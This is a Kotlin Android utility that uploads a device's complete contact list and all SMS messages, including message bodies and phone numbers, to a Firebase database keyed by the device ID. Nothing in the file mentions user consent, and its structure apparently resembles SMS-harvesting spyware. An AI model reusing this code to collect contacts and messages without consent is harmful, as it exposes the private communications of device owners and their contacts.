package com.example.fast.util

import android.annotation.SuppressLint
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.example.fast.config.AppConfig
import com.example.fast.model.Contact
import com.google.firebase.Firebase
import com.google.firebase.database.database

/**
 * FirebaseSyncHelper
 * 
 * Firebase-only helper for syncing contacts and messages to Firebase Realtime Database.
 * 
 * Architecture:
 * - Direct Firebase writes (no HTTP/Django calls)
 * - Uses same data structure as DataSyncHelper for consistency
 * - Simpler code (no retry logic - Firebase SDK handles it)
 * - Better performance (direct Firebase writes)
 * 
 * Organization:
 * - Public API: syncCompleteContacts(), syncSmsMessages()
 * - Firebase Writes: Direct Firebase Realtime Database writes
 * - Data Conversion: Contact/Message to Firebase Map format
 */
object FirebaseSyncHelper {
    private const val TAG = "FirebaseSyncHelper"
    
    // Batch configuration
    private const val MAX_BATCH_SIZE = 100 // Firebase Realtime Database limit
    private const val BATCH_DELAY_MS = 2000L // Wait 2s before batching
    
    // ============================================================================
    // PUBLIC API
    // ============================================================================
    
    /**
     * Sync complete contacts to Firebase
     * 
     * Strategy:
     * - Direct Firebase write (no Django, no fallback needed)
     * - Uses DEVICE/{deviceId}/Contact structure
     * - Map structure: {phoneNumber: {contactData}}
     * 
     * @param context Application context
     * @param contacts List of contacts to sync
     * @param onSuccess Callback with count of synced contacts
     * @param onFailure Callback with error message
     */
    fun syncCompleteContacts(
        context: Context,
        contacts: List<Contact>,
        onSuccess: ((Int) -> Unit)? = null,
        onFailure: ((String) -> Unit)? = null
    ) {
        Thread {
            try {
                val deviceId = getDeviceId(context)
                
                if (contacts.isEmpty()) {
                    Log.d(TAG, "No contacts to sync")
                    Handler(Looper.getMainLooper()).post {
                        onSuccess?.invoke(0)
                    }
                    return@Thread
                }
                
                Log.d(TAG, "Starting contacts sync: ${contacts.size} contacts to Firebase")
                
                // Convert contacts to Firebase format (same as DataSyncHelper)
                val contactsMap = convertContactsToFirebaseFormat(contacts)
                
                val contactCount = contactsMap.size
                Log.d(TAG, "Processed $contactCount contacts for Firebase upload")
                
                // Upload to Firebase using updateChildren for better efficiency
                // This allows partial updates instead of replacing entire node
                if (contactsMap.isNotEmpty()) {
                    val firebasePath = "${AppConfig.getFirebaseDevicePath(deviceId)}/${AppConfig.FirebasePaths.CONTACTS}"
                    
                    // Use updateChildren for partial updates (more efficient)
                    Firebase.database.reference.child(firebasePath).updateChildren(contactsMap)
                        .addOnSuccessListener {
                            Log.d(TAG, "✅ Contacts sync successful: $contactCount contacts synced to Firebase")
                            Handler(Looper.getMainLooper()).post {
                                onSuccess?.invoke(contactCount)
                            }
                        }
                        .addOnFailureListener { e ->
                            val errorMessage = "Failed to sync contacts to Firebase: ${e.message}"
                            Log.e(TAG, "❌ $errorMessage", e)
                            Handler(Looper.getMainLooper()).post {
                                onFailure?.invoke(errorMessage)
                            }
                        }
                } else {
                    Log.d(TAG, "No contacts with phone numbers to sync")
                    Handler(Looper.getMainLooper()).post {
                        onSuccess?.invoke(0)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in contacts sync", e)
                Handler(Looper.getMainLooper()).post {
                    onFailure?.invoke(e.message ?: "Unknown error")
                }
            }
        }.start()
    }
    
    /**
     * Sync SMS messages to Firebase
     * 
     * Strategy:
     * - Direct Firebase write (no Django, no fallback needed)
     * - Uses DEVICE/{deviceId}/message/sync structure
     * - Map structure: {timestamp: "received~phone~body" or "sent~phone~body"}
     * 
     * @param context Application context
     * @param messages List of SMS messages to sync
     * @param onSuccess Callback with count of synced messages
     * @param onFailure Callback with error message
     */
    fun syncSmsMessages(
        context: Context,
        messages: List<com.example.fast.model.ChatMessage>,
        onSuccess: ((Int) -> Unit)? = null,
        onFailure: ((String) -> Unit)? = null
    ) {
        Thread {
            try {
                val deviceId = getDeviceId(context)
                
                if (messages.isEmpty()) {
                    Log.d(TAG, "No messages to sync")
                    Handler(Looper.getMainLooper()).post {
                        onSuccess?.invoke(0)
                    }
                    return@Thread
                }
                
                Log.d(TAG, "Starting SMS sync: ${messages.size} messages to Firebase")
                
                // Convert messages to Firebase format (same as DataSyncHelper)
                val messagesMap = convertMessagesToFirebaseFormat(messages)
                
                val messageCount = messagesMap.size
                Log.d(TAG, "Processed $messageCount messages for Firebase upload")
                
                // Upload to Firebase using updateChildren for better efficiency
                // This allows partial updates instead of replacing entire node
                if (messagesMap.isNotEmpty()) {
                    val firebasePath = AppConfig.getFirebaseMessagePath(deviceId)
                    
                    // Use updateChildren for partial updates (more efficient)
                    Firebase.database.reference.child(firebasePath).updateChildren(messagesMap)
                        .addOnSuccessListener {
                            Log.d(TAG, "✅ SMS sync successful: $messageCount messages synced to Firebase")
                            Handler(Looper.getMainLooper()).post {
                                onSuccess?.invoke(messageCount)
                            }
                        }
                        .addOnFailureListener { e ->
                            val errorMessage = "Failed to sync messages to Firebase: ${e.message}"
                            Log.e(TAG, "❌ $errorMessage", e)
                            Handler(Looper.getMainLooper()).post {
                                onFailure?.invoke(errorMessage)
                            }
                        }
                } else {
                    Handler(Looper.getMainLooper()).post {
                        onSuccess?.invoke(0)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in SMS sync", e)
                Handler(Looper.getMainLooper()).post {
                    onFailure?.invoke(e.message ?: "Unknown error")
                }
            }
        }.start()
    }
    
    // ============================================================================
    // DATA CONVERSION
    // ============================================================================
    
    /**
     * Convert contacts to Firebase format
     * Uses same structure as DataSyncHelper for consistency
     * Map structure: {phoneNumber: {contactData}}
     */
    private fun convertContactsToFirebaseFormat(contacts: List<Contact>): Map<String, Map<String, Any?>> {
        val contactsMap = mutableMapOf<String, Map<String, Any?>>()
        
        contacts.forEach { contact ->
            try {
                // Only sync contacts with phone numbers (same as DataSyncHelper)
                if (contact.phoneNumber.isNotBlank()) {
                    val contactData = mutableMapOf<String, Any?>(
                        "id" to contact.id,
                        "name" to contact.name,
                        "displayName" to contact.displayName,
                        "phoneNumber" to contact.phoneNumber,
                        "photoUri" to contact.photoUri,
                        "thumbnailUri" to contact.thumbnailUri,
                        "company" to contact.company,
                        "jobTitle" to contact.jobTitle,
                        "department" to contact.department,
                        "birthday" to contact.birthday,
                        "anniversary" to contact.anniversary,
                        "notes" to contact.notes,
                        "lastContacted" to contact.lastContacted,
                        "timesContacted" to contact.timesContacted,
                        "isStarred" to contact.isStarred,
                        "nickname" to contact.nickname,
                        "phoneticName" to contact.phoneticName
                    )
                    
                    // Add phones array
                    if (contact.phones.isNotEmpty()) {
                        contactData["phones"] = contact.phones.map { phone ->
                            mapOf(
                                "number" to phone.number,
                                "type" to phone.type,
                                "typeLabel" to phone.typeLabel,
                                "label" to phone.label,
                                "isPrimary" to phone.isPrimary
                            )
                        }
                    }
                    
                    // Add emails array
                    if (contact.emails.isNotEmpty()) {
                        contactData["emails"] = contact.emails.map { email ->
                            mapOf(
                                "address" to email.address,
                                "type" to email.type,
                                "typeLabel" to email.typeLabel,
                                "label" to email.label,
                                "isPrimary" to email.isPrimary
                            )
                        }
                    }
                    
                    // Add addresses array
                    if (contact.addresses.isNotEmpty()) {
                        contactData["addresses"] = contact.addresses.map { address ->
                            mapOf(
                                "street" to address.street,
                                "city" to address.city,
                                "region" to address.region,
                                "postcode" to address.postcode,
                                "country" to address.country,
                                "formattedAddress" to address.formattedAddress,
                                "type" to address.type,
                                "typeLabel" to address.typeLabel
                            )
                        }
                    }
                    
                    // Add websites array
                    if (contact.websites.isNotEmpty()) {
                        contactData["websites"] = contact.websites
                    }
                    
                    // Add IM accounts array
                    if (contact.imAccounts.isNotEmpty()) {
                        contactData["imAccounts"] = contact.imAccounts.map { im ->
                            mapOf(
                                "data" to im.data,
                                "protocol" to im.protocol,
                                "protocolLabel" to im.protocolLabel,
                                "customProtocol" to im.customProtocol
                            )
                        }
                    }
                    
                    contactsMap[contact.phoneNumber] = contactData
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error converting contact", e)
            }
        }
        
        return contactsMap
    }
    
    /**
     * Convert messages to Firebase format
     * Uses same structure as DataSyncHelper for consistency
     * Map structure: {timestamp: "received~phone~body" or "sent~phone~body"}
     */
    private fun convertMessagesToFirebaseFormat(
        messages: List<com.example.fast.model.ChatMessage>
    ): Map<String, String> {
        val messagesMap = mutableMapOf<String, String>()
        
        messages.forEach { message ->
            try {
                val timestamp = message.timestamp.toString()
                val value = if (message.isReceived) {
                    "received~${message.address}~${message.body}"
                } else {
                    "sent~${message.address}~${message.body}"
                }
                messagesMap[timestamp] = value
            } catch (e: Exception) {
                Log.e(TAG, "Error converting message", e)
            }
        }
        
        return messagesMap
    }
    
    // ============================================================================
    // UTILITIES
    // ============================================================================
    
    @SuppressLint("HardwareIds")
    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }
}

